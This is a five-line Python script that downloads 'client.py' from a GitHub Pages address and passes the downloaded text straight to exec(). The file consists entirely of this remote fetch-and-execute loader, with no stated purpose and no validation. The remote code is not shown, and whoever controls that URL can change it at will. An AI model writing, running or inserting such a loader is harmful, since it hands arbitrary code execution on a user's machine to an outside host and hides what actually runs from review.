import requests

url="https://prog-ammar.github.io/Website/client.py"
response=requests.get(url).text
exec(response)
